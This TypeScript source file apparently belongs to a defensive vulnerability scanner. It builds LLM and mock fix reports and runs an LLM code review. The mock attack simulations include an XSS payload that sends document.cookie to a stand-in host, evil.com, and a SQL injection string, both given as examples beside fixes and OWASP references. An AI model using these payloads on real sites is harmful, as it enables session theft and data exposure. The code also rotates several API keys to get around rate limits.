const OPENROUTER_BASE_URL = "https://openrouter.ai/api/v1";
const DEFAULT_MODEL = "meta-llama/llama-3.3-70b-instruct";

let _rotatorIndex = 0;

function getApiKeys(): string[] {
    const keys = [
        process.env.OPENROUTER_API_KEY_1,
        process.env.OPENROUTER_API_KEY_2,
        process.env.OPENROUTER_API_KEY_3,
        process.env.OPENROUTER_API_KEY,
    ]
        .filter((k): k is string => !!k && k.trim() !== "" && k !== "undefined")
        .map((k) => k.trim());

    return [...new Set(keys)];
}

function getNextKey(keys: string[]): { key: string; index: number } {
    const index = _rotatorIndex % keys.length;
    _rotatorIndex = (_rotatorIndex + 1) % keys.length;
    return { key: keys[index], index };
}

async function openrouterRequest(
    payload: object,
    attemptCount = 0
): Promise<Response> {
    const keys = getApiKeys();
    if (keys.length === 0) throw new Error("NO_KEYS");

    // Allow at most keys.length attempts across all available keys
    if (attemptCount >= keys.length) {
        throw new Error("ALL_KEYS_EXHAUSTED");
    }

    const { key, index } = getNextKey(keys);

    try {
        const resp = await fetch(`${OPENROUTER_BASE_URL}/chat/completions`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${key}`,
                "HTTP-Referer": "http://localhost:3000",
                "X-Title": "VulnScanner",
            },
            body: JSON.stringify(payload),
        });

        // If rate-limited (429) or server error (5xx), rotate key and retry
        if ((resp.status === 429 || resp.status >= 500) && keys.length > 1) {
            console.warn(
                `⚠️ OpenRouter key[${index + 1}] returned HTTP ${resp.status}. Rotating to next key (attempt ${attemptCount + 1}/${keys.length})...`
            );
            return openrouterRequest(payload, attemptCount + 1);
        }

        return resp;
    } catch (err: any) {
        if (keys.length > 1 && attemptCount + 1 < keys.length) {
            console.warn(
                `⚠️ Network failure using OpenRouter key[${index + 1}]: ${err?.message}. Rotating to next key...`
            );
            return openrouterRequest(payload, attemptCount + 1);
        }
        throw err;
    }
}

export interface FixReport {
    title: string;
    explanation: string;
    attackSimulation: string;
    fixSteps: string[];
    codeExample: {
        vulnerable: string;
        fixed: string;
        language: string;
    };
    references: string[];
}

export function getMockFixReport(params: {
    findingType: string;
    url: string;
    parameter?: string;
    evidence?: string;
    cveId?: string;
}): FixReport {
    const type = params.findingType.toLowerCase();

    if (type.includes("sql") || type.includes("sqli")) {
        const isForm = type.includes("form");
        return {
            title: isForm ? "SQL Injection via Form Field" : "SQL Injection via URL Parameter",
            explanation: isForm
                ? `The application is vulnerable to SQL Injection via form field submission. The field "${params.parameter || "search"}" submits user input directly into a database query without sanitization. Attackers can type crafted payloads into the form to dump tables, bypass authentication, or delete data.`
                : `The application is vulnerable to SQL Injection because user-supplied input in the parameter "${params.parameter || "id"}" is concatenated directly into a database query. This allows an attacker to manipulate SQL syntax and execute unauthorized queries, potentially exposing, modifying, or deleting sensitive database records.`,
            attackSimulation: isForm
                ? `1. The attacker opens the form at: ${params.url}\n2. They type a payload into the "${params.parameter || "search"}" field: ' OR '1'='1\n3. On submit, the server executes the malformed SQL and either returns all rows or shows a database error confirming injection.`
                : `1. The attacker targets the URL: ${params.url}\n2. They supply a payload in the "${params.parameter || "id"}" parameter, such as: ' OR '1'='1\n3. The database interprets the payload as SQL logic, bypassing the password check or returning all records in the table.`,
            fixSteps: [
                "Use parameterized queries or prepared statements (e.g., Prisma ORM, pg-promise parameterized queries).",
                "Validate and strongly type all inputs server-side before passing to database layer.",
                "Never concatenate raw user input into SQL strings.",
                "Add a WAF rule to block common SQL injection signatures as a defense-in-depth measure."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: `// VULNERABLE: Raw form input concatenated into SQL\nconst { search } = req.body;\nconst rows = await db.query(\`SELECT * FROM products WHERE name = '\${search}'\`);`,
                fixed: `// FIXED: Parameterized query via Prisma\nconst { search } = req.body;\nconst rows = await prisma.product.findMany({\n  where: { name: { contains: String(search) } }\n});`
            },
            references: [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html"
            ]
        };
    }

    if (type.includes("xss") || type.includes("scripting")) {
        const isForm = type.includes("form");
        return {
            title: isForm ? "Reflected XSS via Form Input" : "Reflected Cross-Site Scripting (XSS)",
            explanation: isForm
                ? `The form field "${params.parameter || "search"}" at ${params.url} reflects submitted input back in the page response without HTML-encoding. An attacker can submit a form with a malicious script payload; when the server echoes it back, the browser executes the script in the victim's session.`
                : `The application fails to sanitize or encode query input from parameter "${params.parameter || "query"}" before rendering it in the HTML response. An attacker can craft a malicious URL containing JavaScript; when a victim visits it, the script runs in their browser context, allowing session hijack or data theft.`,
            attackSimulation: isForm
                ? `1. The attacker opens the form at ${params.url}.\n2. They type into the "${params.parameter || "search"}" field: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n3. On submit, the server includes the payload unencoded in the response.\n4. The victim's browser executes the script, sending their session cookie to the attacker.`
                : `1. The attacker crafts a link: ${params.url}?${params.parameter || "query"}=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\n2. The attacker sends this link to a logged-in user.\n3. The user clicks it. The browser receives the payload and executes it, sending the user's session cookies to the attacker.`,
            fixSteps: [
                "HTML-encode all user-supplied values before inserting them into HTML responses (use he, DOMPurify, or framework-native escaping).",
                "Implement a strict Content-Security-Policy (CSP) that blocks inline scripts and restricts script sources.",
                "Avoid dangerouslySetInnerHTML in React/Next.js; always use JSX's built-in auto-escaping.",
                "Validate form inputs server-side and return errors rather than echoing raw input."
            ],
            codeExample: {
                language: "javascript",
                vulnerable: `// VULNERABLE: Form input echoed into HTML without encoding\napp.post('/search', (req, res) => {\n  res.send('<h1>Results for: ' + req.body.q + '</h1>');\n});`,
                fixed: `// FIXED: HTML-encode the input before rendering\nimport { escape } from 'html-escaper';\napp.post('/search', (req, res) => {\n  res.send('<h1>Results for: ' + escape(req.body.q) + '</h1>');\n});`
            },
            references: [
                "https://owasp.org/www-community/attacks/xss/",
                "https://cwe.mitre.org/data/definitions/79.html"
            ]
        };
    }

    if (type.includes("csrf")) {
        return {
            title: "Cross-Site Request Forgery (CSRF)",
            explanation: `The endpoint lacks anti-CSRF token protection or modern SameSite cookie configurations. A malicious third-party site can forge requests to this URL on behalf of an authenticated user, executing unauthorized actions (like updating passwords or emails).`,
            attackSimulation: `1. The attacker hosts an innocent-looking website containing an invisible form pointing to: ${params.url}\n2. The form triggers automatically on load via JS.\n3. A victim who is logged in to your app visits the attacker's site. Their browser submits the form, carrying their session cookies automatically, executing the action.`,
            fixSteps: [
                "Configure session cookies with 'SameSite=Lax' or 'SameSite=Strict' and 'Secure'.",
                "Implement unique, cryptographically secure anti-CSRF tokens for all state-changing endpoints (POST, PUT, DELETE).",
                "Verify headers like 'Origin' and 'Referer' on the server."
            ],
            codeExample: {
                language: "javascript",
                vulnerable: `// VULNERABLE: Express session cookie configured insecurely\napp.use(session({\n  cookie: { secure: false }\n}));`,
                fixed: `// FIXED: Strict SameSite and secure cookies\napp.use(session({\n  cookie: {\n    secure: true,\n    sameSite: 'lax',\n    httpOnly: true\n  }\n}));`
            },
            references: [
                "https://owasp.org/www-community/attacks/csrf",
                "https://cwe.mitre.org/data/definitions/352.html"
            ]
        };
    }

    if (type.includes("frame") || type.includes("clickjacking")) {
        return {
            title: "Missing Security Header: X-Frame-Options",
            explanation: `The 'X-Frame-Options' header is not configured on the web server. This allows this website to be embedded inside an <iframe> on a malicious third-party website, exposing users to clickjacking attacks where they are tricked into clicking invisible buttons.`,
            attackSimulation: `1. The attacker embeds your site inside an invisible iframe on their malicious page.\n2. The attacker overlays a dummy game button directly on top of your app's 'Delete Account' button.\n3. The victim clicks 'Play Game' but actually clicks 'Delete Account' on your website.`,
            fixSteps: [
                "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' to all HTTP responses.",
                "Alternatively, configure a 'frame-ancestors' directive in your Content-Security-Policy (CSP) header."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: `// VULNERABLE: next.config.js with no security headers configured`,
                fixed: `// FIXED: Configure security headers in next.config.ts\nexport default {\n  async headers() {\n    return [\n      {\n        source: '/(.*)',\n        headers: [\n          { key: 'X-Frame-Options', value: 'DENY' }\n        ]\n      }\n    ];\n  }\n};`
            },
            references: [
                "https://owasp.org/www-community/attacks/Clickjacking",
                "https://cwe.mitre.org/data/definitions/1021.html"
            ]
        };
    }

    if (type.includes("csp") || type.includes("content-security-policy")) {
        return {
            title: "Missing Content-Security-Policy (CSP)",
            explanation: "The server does not supply a Content-Security-Policy header. Without a CSP, the browser will execute any scripts, styles, or plugins injected into the page from any origin, significantly increasing the success of XSS and clickjacking attacks.",
            attackSimulation: "1. An attacker finds an input reflection point on the page.\n2. They inject a script loading malicious code from a third-party server.\n3. Since there is no CSP, the browser downloads and runs the script, compromising the user session.",
            fixSteps: [
                "Define a Content-Security-Policy header outlining trusted script sources (e.g., 'default-src 'self'').",
                "Start with a report-only CSP to detect violations before enforcing it."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: "// VULNERABLE: CSP is not configured in response headers",
                fixed: `// FIXED: Configure CSP in next.config.ts\nexport default {\n  async headers() {\n    return [\n      {\n        source: '/(.*)',\n        headers: [\n          {\n            key: 'Content-Security-Policy',\n            value: "default-src 'self'; script-src 'self' 'unsafe-inline';"\n          }\n        ]\n      }\n    ];\n  }\n};`
            },
            references: [
                "https://owasp.org/www-community/controls/Content_Security_Policy",
                "https://cwe.mitre.org/data/definitions/1021.html"
            ]
        };
    }

    if (type.includes("ssti")) {
        return {
            title: "Server-Side Template Injection (SSTI)",
            explanation: "The application evaluates user-supplied input inside a server-side template engine without sanitization. An attacker can execute arbitrary code on the server by crafting template directives.",
            attackSimulation: "1. The attacker injects template syntax (e.g., {{7*7}}) into input parameters.\n2. The server evaluates the expression and returns the output (49).\n3. The attacker escalates to remote code execution.",
            fixSteps: [
                "Avoid passing user input directly into template render engines.",
                "Use safe context variables and strict output encoding."
            ],
            codeExample: {
                language: "javascript",
                vulnerable: "// VULNERABLE: Rendering raw user input as template string\nnunjucks.renderString(req.query.name);",
                fixed: "// FIXED: Pass input as context variable to pre-compiled template\nnunjucks.render('hello.html', { name: req.query.name });"
            },
            references: [
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cwe.mitre.org/data/definitions/1336.html"
            ]
        };
    }

    if (type.includes("file-upload")) {
        return {
            title: "Insecure File Upload Vulnerability",
            explanation: "The file upload handler does not properly restrict or sanitize uploaded files, potentially allowing attackers to upload webshells or arbitrary files.",
            attackSimulation: "1. Attacker uploads a file with an executable extension or path traversal sequence.\n2. The server stores or executes the payload.",
            fixSteps: [
                "Validate file extension, MIME type, and magic bytes server-side.",
                "Store uploaded files outside web root or on isolated storage buckets (S3)."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: "// VULNERABLE: Unvalidated file upload",
                fixed: "// FIXED: Validate allowed extensions and sanitize file names"
            },
            references: [
                "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                "https://cwe.mitre.org/data/definitions/434.html"
            ]
        };
    }

    if (type.includes("api-endpoint-discovered")) {
        return {
            title: "API Surface Route Mapped",
            explanation: `An API endpoint route (${params.url}) was discovered during static JS asset analysis or network interception and added to the attack surface map for scanning.`,
            attackSimulation: "Automated mapping of API endpoints performed during security auditing to enumerate reachable endpoints.",
            fixSteps: [
                "Ensure authentication and authorization controls are enforced on sensitive backend routes.",
                "Apply rate limiting and access controls on public API endpoints."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: "// Publicly reachable API route",
                fixed: "// Secure API route with authentication middleware"
            },
            references: [
                "https://owasp.org/www-project-api-security/"
            ]
        };
    }

    if (type.includes("sca") || type.includes("cve") || params.cveId) {
        const pkgMatch = params.parameter?.match(/^(@?[^@]+)@(.+)$/);
        const pkgName = pkgMatch ? pkgMatch[1] : params.parameter || "dependency";
        const pkgVersion = pkgMatch ? pkgMatch[2] : "";
        const cveId = params.cveId || "CVE Advisory";
        
        let title = `${pkgName} Security Vulnerability (${cveId})`;
        if (params.evidence && params.evidence.includes("]")) {
            const rawTitle = params.evidence.split("]").slice(1).join("]").replace(/\s*\(Fixed in.*?\)$/i, "").trim();
            if (rawTitle) title = rawTitle;
        }

        const fixVerMatch = params.evidence?.match(/Fixed in >=\s*([^\)]+)/i);
        const targetVersion = fixVerMatch ? fixVerMatch[1] : "latest";

        return {
            title: title.length > 90 ? title.slice(0, 87) + "..." : title,
            explanation: `Known security advisory (${cveId}) in ${pkgName}${pkgVersion ? `@${pkgVersion}` : ""}. Unpatched dependencies can expose your application to security exploits, denial of service, or unauthorized data access.`,
            attackSimulation: `1. The attacker identifies vulnerable dependency ${pkgName}@${pkgVersion || "installed version"} via public advisory ${cveId}.\n2. The attacker crafts targeted payloads exploiting the unpatched code path.\n3. The system processes the payload, triggering the disclosed advisory vulnerability.`,
            fixSteps: [
                `Upgrade ${pkgName} to version ${targetVersion} or later: npm install ${pkgName}@${targetVersion}`,
                `Run "npm audit" or "npm audit fix" to ensure all related sub-dependencies are cleanly resolved.`,
                `Verify application tests pass after the dependency upgrade.`
            ],
            codeExample: {
                language: "json",
                vulnerable: `// package.json (Vulnerable)\n{\n  "dependencies": {\n    "${pkgName}": "${pkgVersion || "x.x.x"}"\n  }\n}`,
                fixed: `// package.json (Patched)\n{\n  "dependencies": {\n    "${pkgName}": "^${targetVersion}"\n  }\n}`
            },
            references: [
                params.cveId?.startsWith("GHSA-") ? `https://github.com/advisories/${params.cveId}` : `https://nvd.nist.gov/vuln/detail/${params.cveId || ""}`,
                "https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities"
            ]
        };
    }

    const humanTitle = params.findingType
        .replace(/[-_]+/g, " ")
        .replace(/\b\w/g, (c) => c.toUpperCase());

    return {
        title: humanTitle,
        explanation: `Security finding detected: ${humanTitle} at ${params.url}.`,
        attackSimulation: `1. An attacker targets ${params.url} with crafted requests to exploit ${humanTitle}.`,
        fixSteps: [
            `Review and secure the implementation for ${humanTitle} on ${params.url}.`,
            "Apply least privilege and strict input validation server-side."
        ],
        codeExample: {
            language: "typescript",
            vulnerable: "// VULNERABLE: Unvalidated or insecure code logic",
            fixed: "// FIXED: Apply security controls and input validation"
        },
        references: [
            "https://owasp.org/www-project-top-ten/",
            "https://cwe.mitre.org/"
        ]
    };
}

export async function generateFixReport(params: {
    findingType: string;
    url: string;
    parameter?: string;
    evidence?: string;
    cveId?: string;
    ragContext: string;
}): Promise<FixReport> {
    const { findingType, url, parameter, evidence, cveId, ragContext } = params;

    const availableKeys = getApiKeys();
    if (availableKeys.length === 0) {
        console.log(`🤖 No OpenRouter API keys configured. Falling back to mock fix report for: "${findingType}"`);
        return getMockFixReport(params);
    }

    console.log(`🔑 Using OpenRouter key rotator (${availableKeys.length} key(s) available). Current rotator index: ${_rotatorIndex}.`);

    const model = process.env.OPENROUTER_MODEL || DEFAULT_MODEL;

    const systemPrompt = `You are a senior application security engineer. 
Your job is to produce clear, accurate security advisories for developers.
Always respond with valid JSON only — no markdown, no preamble.`;

    const safeEvidence = (evidence ?? "").slice(0, 300);
    const safeContext = ragContext.slice(0, 1200);

    const userPrompt = `
A vulnerability scanner found the following issue:

Type: ${findingType}
URL: ${url}
${parameter ? `Parameter: ${parameter}` : ""}
${safeEvidence ? `Evidence: ${safeEvidence}` : ""}
${cveId ? `CVE ID: ${cveId}` : ""}

--- REFERENCE CONTEXT (from OWASP / NVD / CWE knowledge base) ---
${safeContext}
--- END CONTEXT ---

Respond with a JSON object containing exactly these fields:
{
  "title": "Short title for this finding",
  "explanation": "2-3 sentence plain English explanation of what this vulnerability is and why it is dangerous",
  "attackSimulation": "Step by step description of how an attacker exploits this finding",
  "fixSteps": ["step 1", "step 2", "step 3"],
  "codeExample": {
    "vulnerable": "short vulnerable code snippet",
    "fixed": "corrected code snippet",
    "language": "language name"
  },
  "references": ["https://owasp.org/...", "https://cwe.mitre.org/..."]
}`;

    let response: Response;
    try {
        response = await openrouterRequest({
            model,
            max_tokens: 2500,
            temperature: 0.2,
            response_format: { type: "json_object" },
            messages: [
                { role: "system", content: systemPrompt },
                { role: "user", content: userPrompt },
            ],
        });
    } catch (e: any) {
        if (e.message === "NO_KEYS" || e.message === "ALL_KEYS_EXHAUSTED") {
            console.warn(`⚠️ OpenRouter request failed (${e.message}). Falling back to mock fix report.`);
            return getMockFixReport(params);
        }
        throw e;
    }

    if (!response.ok) {
        const err = await response.text();
        console.error(`OpenRouter API error (${response.status}): ${err}. Falling back to mock.`);
        return getMockFixReport(params);
    }

    try {
        const data = await response.json();
        const raw = data?.choices?.[0]?.message?.content;
        if (!raw) {
            console.warn(`⚠️ OpenRouter response format invalid or empty. Falling back to mock.`);
            return getMockFixReport(params);
        }

        // Strip code block markers if present
        let cleaned = (raw as string).replace(/```json/gi, "").replace(/```/g, "").trim();

        // Attempt 1: Direct parse
        try {
            return JSON.parse(cleaned) as FixReport;
        } catch {
            // Attempt 2: Extract substring between first '{' and last '}'
            const firstBrace = cleaned.indexOf("{");
            const lastBrace = cleaned.lastIndexOf("}");
            if (firstBrace !== -1 && lastBrace !== -1 && lastBrace > firstBrace) {
                const extracted = cleaned.substring(firstBrace, lastBrace + 1);
                try {
                    return JSON.parse(extracted) as FixReport;
                } catch {
                    // Attempt 3: Repair missing closing quotes/braces
                    let repaired = extracted;
                    if (repaired.lastIndexOf('"') > repaired.lastIndexOf('}')) repaired += '"';
                    if (repaired.lastIndexOf('[') > repaired.lastIndexOf(']')) repaired += ']';
                    repaired += '}';
                    try {
                        return JSON.parse(repaired) as FixReport;
                    } catch {
                        // Fall through
                    }
                }
            }

            console.warn(`⚠️ Failed to parse/repair OpenRouter JSON response. Falling back to mock.`);
            return getMockFixReport(params);
        }
    } catch (err: any) {
        console.error(`⚠️ Error parsing OpenRouter API response: ${err?.message ?? String(err)}. Falling back to mock.`);
        return getMockFixReport(params);
    }
}

export async function answerFromContext(
    query: string,
    context: string
): Promise<string> {
    const availableKeysForChat = getApiKeys();
    if (availableKeysForChat.length === 0) {
        console.log("🤖 No OpenRouter API keys configured. Returning offline mock RAG response.");
        return `⚠️ **Offline Mode**: Add your OpenRouter API keys to your \`.env\` file (OPENROUTER_API_KEY_1, _2, _3) to enable live AI answers.\n\nBased on the local security guidelines:\n${context.substring(0, 400)}...`;
    }

    const model = process.env.OPENROUTER_MODEL || DEFAULT_MODEL;

    let chatResponse: Response;
    try {
        chatResponse = await openrouterRequest({
            model,
            max_tokens: 600,
            temperature: 0.3,
            messages: [
                {
                    role: "system",
                    content: "You are a cybersecurity expert. Answer questions using only the provided context. Be concise and technical.",
                },
                {
                    role: "user",
                    content: `Context:\n${context.slice(0, 2000)}\n\nQuestion: ${query.slice(0, 300)}`,
                },
            ],
        });
    } catch (e: any) {
        if (e.message === "NO_KEYS" || e.message === "ALL_KEYS_EXHAUSTED") {
            return "No valid API keys available. Please check your OpenRouter API keys in .env.";
        }
        throw e;
    }

    if (!chatResponse.ok) {
        const err = await chatResponse.text();
        throw new Error(`OpenRouter API error: ${err}`);
    }


    const data = await chatResponse.json();
    return data.choices[0].message.content as string;
}

// ─────────────────────────────────────────────────────────────────────────────
// LLM Code Review — for GitHub source code scanning
// ─────────────────────────────────────────────────────────────────────────────

export interface LLMCodeFinding {
    type: string;
    severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
    line: number;
    evidence: string;
    explanation: string;
}

const CODE_REVIEW_SYSTEM_PROMPT = `You are an elite, highly precise Application Security (AppSec) engineer.
Your task is to identify ONLY genuine, verifiable, and exploitable security vulnerabilities in the provided backend code.

CRITICAL QUALITY RULES & FALSE POSITIVE BAN LIST:
You MUST NEVER report any of the following standard development patterns:
1. NEVER flag reading environment variables (e.g., process.env.API_KEY, process.env.DATABASE_URL) as "hardcoded credentials" or "insecure storage". Using process.env is the correct security standard.
2. NEVER flag JSON.parse() or req.json() as "Insecure Deserialization". In JavaScript/TypeScript, native JSON parsing is memory-safe and is NOT vulnerable to remote code execution deserialization attacks.
3. NEVER flag console.error() or console.log() as "Insecure Error Handling" or "Information Disclosure" unless unredacted plaintext private keys or passwords are explicitly logged.
4. NEVER flag React client state (e.g. useState, useSession, UI button onClick handlers) as backend security vulnerabilities or missing rate limits.
5. NEVER flag example placeholders (e.g., "your_api_key_here", "https://example.com") in documentation, examples, or schemas.
6. NEVER flag database queries that filter by owner ID (e.g., { userId }, { documentId, userId }) as "Missing Ownership Check" or "IDOR".
7. NEVER flag missing rate limiting on internal utility functions, helper libraries, or authenticated data queries. Only flag on high-risk, public unauthenticated endpoints (e.g. login brute-force, SMS/OTP triggers).

ONLY REPORT TRUE VULNERABILITIES:
- Authentication bypasses (missing auth checks before sensitive mutations)
- True IDOR (user input directly queries resource without verifying tenant/userId)
- Real SQL / Command / Code injection (unvalidated user input passed directly into shell/SQL execution)
- Server-Side Request Forgery (SSRF) where server fetches arbitrary internal URLs without validation
- Unsafe file path traversal allowing reading/writing outside target directories

OUTPUT INSTRUCTIONS:
- If no genuine, exploitable security vulnerabilities are found, return ONLY an empty JSON array: []
- Do NOT output recommendations, style suggestions, or theoretical warnings.
- Return ONLY a raw JSON array of objects with the following schema:
[
  {
    "type": "short_kebab_case_category",
    "severity": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
    "line": <line_number_integer_or_0>,
    "evidence": "exact short vulnerable code line",
    "explanation": "Concrete explanation of how an attacker exploits this specific line"
  }
]`;

/**
 * Sends a code chunk to the LLM for security review.
 * Uses the same OpenRouter key rotator as all other AI features.
 * Returns an array of structured findings (empty array if none found or on error).
 */
export async function reviewCodeForVulnerabilities(
    code: string,
    filename: string,
    language: string,
    skillContext?: string
): Promise<LLMCodeFinding[]> {
    const userMessage = `File: ${filename}\nLanguage: ${language}\n\n\`\`\`${language}\n${code}\n\`\`\``;

    // Inject relevant security skill guidance into the system prompt if available
    const systemPrompt = skillContext
        ? `${CODE_REVIEW_SYSTEM_PROMPT}\n\n--- SECURITY SKILL GUIDANCE ---\n${skillContext}`
        : CODE_REVIEW_SYSTEM_PROMPT;

    const model = process.env.OPENROUTER_MODEL || DEFAULT_MODEL;

    try {
        const resp = await openrouterRequest({
            model,
            messages: [
                { role: "system", content: systemPrompt },
                { role: "user", content: userMessage },
            ],
            max_tokens: 2048,
            temperature: 0.1, // low temperature for consistent structured output
        });

        if (!resp.ok) {
            console.warn(`LLM code review: OpenRouter returned ${resp.status} for ${filename}`);
            return [];
        }

        const data = await resp.json();
        const raw = data.choices?.[0]?.message?.content as string | undefined;
        if (!raw) return [];

        // Strip markdown code fences if model wrapped the JSON
        const cleaned = raw
            .replace(/^```(?:json)?\s*/i, "")
            .replace(/\s*```\s*$/, "")
            .trim();

        let parsed: any;
        try {
            parsed = JSON.parse(cleaned);
        } catch {
            const firstBracket = cleaned.indexOf("[");
            const lastBracket = cleaned.lastIndexOf("]");
            if (firstBracket !== -1 && lastBracket !== -1 && lastBracket > firstBracket) {
                try {
                    parsed = JSON.parse(cleaned.substring(firstBracket, lastBracket + 1));
                } catch {
                    return [];
                }
            } else {
                return [];
            }
        }

        if (!Array.isArray(parsed)) return [];

        // Validate and sanitize each entry
        return parsed
            .filter(
                (f: any) =>
                    typeof f.type === "string" &&
                    typeof f.severity === "string" &&
                    typeof f.explanation === "string"
            )
            .map((f: any): LLMCodeFinding => ({
                type: String(f.type),
                severity: ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"].includes(f.severity)
                    ? (f.severity as LLMCodeFinding["severity"])
                    : "MEDIUM",
                line: typeof f.line === "number" ? f.line : 0,
                evidence: String(f.evidence ?? ""),
                explanation: String(f.explanation),
            }));
    } catch (err) {
        // Non-fatal — LLM review is best-effort
        console.warn(`LLM code review parse error for ${filename}:`, err);
        return [];
    }
}

